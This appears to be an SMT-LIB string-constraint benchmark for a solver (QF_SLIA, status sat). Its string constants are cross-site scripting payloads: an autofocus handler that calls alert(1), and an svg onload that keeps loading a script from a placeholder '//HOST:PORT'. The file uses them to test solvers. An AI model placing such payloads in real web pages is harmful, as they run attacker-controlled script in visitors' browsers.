; random_mix, Unicode mode: x, z from disjunctions of constants, y = x ++ z, clauses of 1 to 3 random (negated) constraints of x, y, z: memberships, affixes, contains, lengths, str.at, str.indexof, str.substr, str.replace
(set-logic QF_SLIA)
(set-info :status sat)
(declare-const x String)
(declare-const y String)
(declare-const z String)
(assert (or (= x "<summary onfocusout=alert(1) tabindex=1 id=x></summary><input autofocus>") (= x "<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>")))
(assert (or (= z "rt(1)></blockquote><input autofocus>") (= z "rtc>") (= z "></head><input autofocus>")))
(assert (= y (str.++ x z)))
(assert (or (str.in_re z ((_ re.from_regex ecma2020 u) "\d+(\.\d{0,20})?")) (not (= "on(){" (str.substr x 30 5)))))
(assert (not (= (str.at x 82) "c")))
(assert (= " " (str.substr y 97 1)))
(assert (or (not (str.suffixof ")>rtc>" y)) (str.suffixof "s>" y) (= (str.indexof z "rtc" 0) 0)))
(assert (or (not (= (str.at z 3) ">")) (not (str.in_re x ((_ re.from_regex ecma2020 u) "[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,10}$")))))
(assert (or (not (= "<svg onload=setInterval(function(){with(document)body.appendChild(create<b>nt('script')).src='//HOST:PORT'},0)>rt(1)></blockquote><input autofocus>" (str.replace y "Eleme" "<b>"))) (str.contains (str.replace y "ut=al" "x") "oxer") (not (str.prefixof "<s" x))))
(assert (or (str.prefixof "<" y) (str.contains x ":PORT'},")))
(assert (str.contains x " o"))
(check-sat)
